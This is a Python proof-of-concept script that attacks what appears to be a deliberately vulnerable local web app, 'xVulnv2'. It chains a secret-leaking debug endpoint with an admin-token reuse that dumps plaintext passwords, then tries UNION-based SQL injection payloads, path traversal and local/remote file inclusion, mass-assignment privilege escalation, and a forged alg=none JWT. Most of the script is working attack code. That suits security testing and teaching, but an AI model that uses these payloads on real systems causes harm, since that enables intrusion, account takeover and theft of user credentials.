import urllib.request
import urllib.parse
import json
import sys
import io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
BASE = "http://localhost:4443"
WARN = "[!]"
OK = "[+]"
MISS = "[-]"

def req(path, method="GET", headers=None, data=None):
    headers = headers or {}
    url = BASE + path
    body = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body = json.dumps(data).encode()
            headers.setdefault("Content-Type", "application/json")
        else:
            body = data.encode() if isinstance(data, str) else data
    r = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return None, str(e)

print("="*70)
print("LIVE PoCs — xVulnv2 (1.7.0) running on :4443")
print("="*70)

# C4: Debug Info
print("\n[C4] /api/debug/info  (Critical: dumps secrets)")
status, body = req("/api/debug/info")
print(f"  HTTP {status}")
data = json.loads(body)
for k, v in data.items():
    if "token" in k.lower() or "key" in k.lower() or "password" in k.lower():
        print(f"  {WARN} {k}: {v}")
    else:
        print(f"     {k}: {v}")

# C3 + C4 chain: Use leaked token to dump all users
print("\n[C3+C4 chain] /admin/users with leaked X-Admin-Token")
status, body = req("/admin/users", headers={"X-Admin-Token": data["admin_token"]})
print(f"  HTTP {status}")
users = json.loads(body)
print(f"  {WARN} {len(users)} users with plaintext passwords:")
for u in users:
    print(f"     {u['username']}:{u['password']}  (role={u['role']})")

# C1: SQLi — try multiple variants
print("\n[C1] /api/menu/{id} SQLi — UNION SELECT attempts")
payloads = [
    "/api/menu/0 UNION SELECT 1,username,email,password,role,image_url,1 FROM users--",
    "/api/menu/0%20UNION%20SELECT%201,username,email,password,role,image_url,1%20FROM%20users--",
    "/api/menu/?id=0%20UNION%20SELECT%201,username,email,password,role,image_url,1%20FROM%20users--",
    "/api/menu/0' UNION SELECT 1,username,email,password,role,image_url,1 FROM users--",
]
for p in payloads:
    status, body = req(p)
    if "username" in body or "password" in body or "admin" in body.lower():
        print(f"  {OK} HIT: {p[:80]}")
        print(f"     HTTP {status}: {body[:300]}")
    else:
        print(f"  {MISS} miss: {p[:60]}... -> {body[:80]}")

# H7: Path traversal
print("\n[H7] /api/files path traversal")
traversals = [
    "/api/files?name=../../go.mod",
    "/api/files?name=../../../go.mod",
    "/api/files?name=../../main.go",
    "/api/files?name=../../../main.go",
    "/api/files?file=../../go.mod",
    "/api/files?path=../../go.mod",
]
for t in traversals:
    status, body = req(t)
    if status == 200 and "package " in body:
        print(f"  {OK} HIT: {t}")
        print(f"     {body[:200]}")
    else:
        print(f"  {MISS} miss: {t} -> {body[:60]}")

# C5: Mass assignment
print("\n[C5] /register?role=admin  (Mass Assignment)")
status, body = req("/register?role=admin", method="POST",
                   data="username=hacker1&email=h1@h.com&password=hack123&role=admin",
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
print(f"  HTTP {status}: {body[:200]}")
# Try to log in as the new admin
status, body = req("/login", method="POST",
                   data="username=hacker1&password=hack123",
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
print(f"  Login attempt: HTTP {status}: {body[:200]}")
# Check role by hitting /admin/users with the session
cookies = {}
import http.cookiejar
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
r = urllib.request.Request(BASE + "/login", data=b"username=hacker1&password=hack123",
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
try:
    resp = opener.open(r, timeout=5)
    print(f"  Login via cookie: HTTP {resp.status}")
    # Now use that session to hit /admin/users
    r2 = urllib.request.Request(BASE + "/admin/users")
    try:
        resp2 = opener.open(r2, timeout=5)
        body2 = resp2.read().decode("utf-8", errors="replace")
        print(f"  Admin route with hacker1 session: HTTP {resp2.status}")
        if "admin" in body2.lower():
            print(f"  {WARN} SUCCESS -- role=admin persisted via mass assignment")
            print(f"     {body2[:300]}")
    except Exception as e:
        print(f"  Admin route blocked: {e}")
except Exception as e:
    print(f"  Login error: {e}")

# C2: SQLi in search
print("\n[C2] /api/search SQLi")
payloads2 = [
    "/api/search?q=' UNION SELECT 1,username,email,password,role,image_url,1 FROM users--",
    "/api/search?q=%27%20UNION%20SELECT%201,username,email,password,role,image_url,1%20FROM%20users--",
]
for p in payloads2:
    status, body = req(p)
    if "admin" in body.lower() or "password" in body.lower():
        print(f"  {OK} HIT: {p[:80]}")
        print(f"     {body[:300]}")
    else:
        print(f"  {MISS} miss: {p[:60]}... -> {body[:80]}")

# C6: LFI in recipe viewer
print("\n[C6] LFI / RFI in recipe viewer")
lfi_paths = [
    "/api/recipe?source=../../go.mod",
    "/api/recipe?source=../../main.go",
    "/api/recipe?source=../../handlers/admin.go",
    "/api/recipe?source=file:///c:/Program%20Files/go/README.md",
]
for p in lfi_paths:
    status, body = req(p)
    if status == 200 and len(body) > 100 and ("package " in body or "func " in body or "main" in body):
        print(f"  {OK} LFI HIT: {p}")
        print(f"     {body[:200]}")
    else:
        print(f"  {MISS} miss: {p[:60]} -> {body[:80]}")

# C7: JWT none-alg bypass
print("\n[C7] JWT bypass attempts")
import base64
def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
hdr = b64({"alg": "none", "typ": "JWT"})
payload = b64({"role": "admin", "user": "admin", "exp": 9999999999})
forged = f"{hdr}.{payload}."  # empty signature
print(f"  Forged JWT (alg=none): {forged[:50]}...")
for path in ["/api/staff/panel", "/api/admin/staff"]:
    status, body = req(path, headers={"Authorization": f"Bearer {forged}"})
    print(f"  {path}: HTTP {status}: {body[:150]}")
